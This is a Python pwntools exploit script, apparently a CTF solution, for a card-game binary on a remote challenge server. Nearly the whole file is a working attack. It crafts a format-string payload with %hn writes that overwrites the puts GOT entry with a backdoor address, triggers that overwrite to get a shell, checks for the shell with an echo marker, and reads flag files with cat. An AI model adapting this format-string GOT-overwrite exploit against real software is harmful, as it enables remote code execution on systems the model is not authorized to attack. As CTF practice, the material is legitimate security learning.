#!/usr/bin/env python3
from pwn import *
import re
import time

context.log_level = "info"

HOST = "tcp.sillyctf.psuccso.org"
PORT = 30576

PUTS_GOT = 0x0804C038
BACKDOOR = 0x08049BA2


def quote_ctrl(bs: bytes) -> bytes:
    """Remote line discipline butuh Ctrl-V (0x16) sebelum byte kontrol (<0x20)."""
    out = bytearray()
    for b in bs:
        if b < 0x20:
            out.append(0x16)
        out.append(b)
    return bytes(out)


def find_mega_idx(text: str):
    m = re.search(r"You found a MEGA card!.*?Card #(\d+)", text, re.S)
    return int(m.group(1)) if m else None


def build_payload() -> bytes:
    hi = (BACKDOOR >> 16) & 0xFFFF
    lo = BACKDOOR & 0xFFFF
    raw = p32(PUTS_GOT + 2) + p32(PUTS_GOT)
    raw += f"%{hi - 8}c%7$hn%{(lo - hi) & 0xFFFF}c%8$hn".encode()
    return quote_ctrl(raw)


def exploit(host=HOST, port=PORT, attempts=15):
    payload = build_payload()

    for i in range(1, attempts + 1):
        log.info(f"attempt {i}/{attempts}")
        p = remote(host, port)
        try:
            time.sleep(0.4)
            p.send(b"o\n" * 100)
            time.sleep(1.0)
            out = p.recvrepeat(1.2).decode("latin-1", "ignore")

            idx = find_mega_idx(out)
            if idx is None:
                log.warning("no MEGA card found, retry")
                p.close()
                continue

            log.success(f"MEGA index = {idx}")

            p.send(b"r\n" + str(idx).encode() + b"\n" + payload + b"\n")
            time.sleep(0.2)

            # trigger print_card_stats -> puts() -> backdoor
            p.send(b"s\n" + str(idx).encode() + b"\n")
            time.sleep(1.0)

            p.send(b"echo __PWNED__\n")
            chk = p.recvrepeat(1.8)
            if b"__PWNED__" not in chk:
                log.warning("shell marker not found, retry")
                p.close()
                continue

            log.success("shell acquired")
            p.send(b"cat flag* 2>/dev/null;cat /flag* 2>/dev/null;cat /home/*/flag* 2>/dev/null\n")
            data = p.recvrepeat(1.5).decode("latin-1", "ignore")
            print(data)

            m = re.search(r"([A-Za-z0-9_]+\{[^\n\r}]+\}\$?)", data)
            if m:
                flag = m.group(1)
                print(f"\n<FLAG>{flag}</FLAG>")
            p.close()
            return
        except Exception as e:
            log.warning(f"error: {e}")
            try:
                p.close()
            except Exception:
                pass

    log.failure("all attempts failed")


if __name__ == "__main__":
    exploit()
